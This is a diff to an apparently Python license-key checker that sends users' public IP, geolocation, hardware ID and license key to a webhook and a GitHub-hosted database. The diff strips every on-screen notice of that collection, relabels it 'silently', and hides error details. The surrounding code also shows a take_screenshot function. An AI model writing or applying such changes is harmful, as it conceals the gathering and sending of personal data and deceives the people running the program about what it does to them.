@@ -343,11 +343,9 @@ def update_license_data_with_ip(license_key, new_hwid, new_id="", geo_info=None)
         if update_response.status_code in [200, 201]:
             return True
         else:
-            print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}GitHub API error: {update_response.status_code}{Style.RESET_ALL}")
             return False
             
-    except Exception as e:
-        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Update error: {e}{Style.RESET_ALL}")
+    except Exception:
         return False
 
 def take_screenshot():
@@ -442,8 +440,7 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
             response = requests.post(webhook_url, json=payload, timeout=10)
             return response.status_code == 200
             
-    except Exception as e:
-        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Webhook error: {e}{Style.RESET_ALL}")
+    except Exception:
         return False
 
 def clear_console_keep_ascii():
@@ -618,8 +615,7 @@ def validate_license_key():
                     display_gradient_ascii_header_only()
                     print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}New activation detected{Style.RESET_ALL}")
                     
-                    # Get IP and geolocation for security
-                    print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Collecting IP information...{Style.RESET_ALL}")
+                    # Get IP and geolocation silently
                     ip_address = get_public_ip()
                     geo_info = get_geo_location(ip_address)
                     
@@ -630,13 +626,11 @@ def validate_license_key():
                         save_id_to_file(user_id, user_key)
                     
                     # Send webhook notification with geolocation
-                    print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Sending security notification...{Style.RESET_ALL}")
                     send_webhook(user_key, current_hwid, user_id, geo_info)
                     
                     # Update GitHub database with HWID, ID, and IP information
-                    print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating private database with IP info...{Style.RESET_ALL}")
                     if update_license_data_with_ip(user_key, current_hwid, user_id, geo_info):
-                        print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated! IP info saved.{Style.RESET_ALL}")
+                        print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}License activated!{Style.RESET_ALL}")
                         time.sleep(2)
                         return True, user_key
                     else:
@@ -649,8 +643,7 @@ def validate_license_key():
                         display_gradient_ascii_header_only()
                         print(f"{get_color('light')}[+]{Style.RESET_ALL} {Fore.GREEN}Hardware verified{Style.RESET_ALL}")
                         
-                        # Update last activity time in database (without new IP info)
-                        print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}Updating activity timestamp...{Style.RESET_ALL}")
+                        # Update last activity time in database
                         update_license_data_with_ip(user_key, current_hwid, user_id, None)
                         
                         if user_id and not os.path.exists("ID.txt"):
@@ -661,15 +654,14 @@ def validate_license_key():
                         clear_console_keep_ascii()
                         display_gradient_ascii_header_only()
                         print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
-                        print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Your HWID: {current_hwid[:16]}...{Style.RESET_ALL}")
-                        print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Database HWID: {stored_hwid[:16]}...{Style.RESET_ALL}")
-                        print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv{Style.RESET_ALL}")
+                        print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
                         
                         for i in range(10, 0, -1):
                             clear_console_keep_ascii()
                             display_gradient_ascii_header_only()
                             print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Hardware mismatch!{Style.RESET_ALL}")
-                            print(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
+                            print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}If this is a mistake, DM @uekv on discord{Style.RESET_ALL}")
+                            print(f"\n{get_color('medium')}[!]{Style.RESET_ALL} {Fore.RED}Closing in {i}...{Style.RESET_ALL}")
                             time.sleep(1)
                         return False, ""
         
@@ -691,7 +683,7 @@ def validate_license_key():
     except Exception as e:
         clear_console_keep_ascii()
         display_gradient_ascii_header_only()
-        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error: {e}{Style.RESET_ALL}")
+        print(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}Database error{Style.RESET_ALL}")
         return False, ""
     
     return False, ""
